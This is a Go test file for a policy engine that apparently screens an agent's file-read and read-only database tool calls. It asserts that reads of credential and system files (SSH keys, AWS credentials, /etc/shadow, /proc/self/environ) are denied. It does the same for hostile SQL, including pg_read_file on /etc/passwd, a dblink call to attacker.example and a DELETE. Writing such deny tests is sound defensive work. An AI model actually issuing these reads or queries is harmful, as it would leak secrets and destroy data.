package policy

import (
	"encoding/json"
	"testing"
)

func mustArgs(t *testing.T, v any) json.RawMessage {
	t.Helper()
	b, err := json.Marshal(v)
	if err != nil {
		t.Fatal(err)
	}
	return b
}

func TestReadFileSensitivePathsDenied(t *testing.T) {
	eng := New()
	cases := []struct {
		path string
		want bool // true => allowed
	}{
		{"runbooks/checkout.md", true},
		{"deployments/checkout/c9f17a2d.txt", true},
		{"logs/app/checkout.log", true},
		{"/etc/passwd", false},
		{"/etc/shadow", false},
		{"/etc/sudoers", false},
		{"/home/deploy/.ssh/id_rsa", false},
		{"/home/deploy/.aws/credentials", false},
		{"config/secrets.yaml", false},
		{"/srv/app/token_store.db", false},
		{"certs/server.pem", false},
		{"/proc/self/environ", false},
		{"", false},
	}
	for _, tc := range cases {
		d := eng.Evaluate("read_file", mustArgs(t, map[string]string{"path": tc.path}))
		if got := d.Decision == "allowed"; got != tc.want {
			t.Errorf("path %q: decision=%s (%s), allowed=%v", tc.path, d.Decision, d.Reason, tc.want)
		}
	}
}

func TestReadFileMissingPathDenied(t *testing.T) {
	eng := New()
	if d := eng.Evaluate("read_file", json.RawMessage(`{}`)); d.Decision == "allowed" {
		t.Fatal("empty args must not be allowed")
	}
}

func TestSQLDestructiveFunctionsStillDenied(t *testing.T) {
	eng := New()
	for _, sql := range []string{
		"SELECT pg_read_file('/etc/passwd')",
		"SELECT * FROM dblink('host=attacker.example dbname=prod','select 1')",
		"DELETE FROM orders WHERE status='pending'",
	} {
		d := eng.Evaluate("query_postgres_readonly", mustArgs(t, map[string]string{"sql": sql}))
		if d.Decision != "denied" {
			t.Errorf("sql %q not denied: %+v", sql, d)
		}
	}
}
